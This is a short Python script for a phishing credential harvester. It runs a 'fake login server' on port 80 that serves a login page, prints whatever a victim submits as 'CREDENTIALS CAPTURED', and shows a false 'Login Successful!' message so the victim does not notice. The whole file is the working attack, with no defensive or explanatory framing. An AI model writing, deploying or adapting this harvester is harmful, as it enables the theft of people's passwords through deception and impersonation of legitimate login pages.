from http.server import HTTPServer, BaseHTTPRequestHandler

class LoginHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        with open('index.html', 'rb') as f:
            self.wfile.write(f.read())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"\n[+] CREDENTIALS CAPTURED: {post_data}\n")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>Login Successful!</h1><p>You have been logged in.</p>")

server = HTTPServer(('0.0.0.0', 80), LoginHandler)
print("Fake login server running on port 80...")
server.serve_forever()
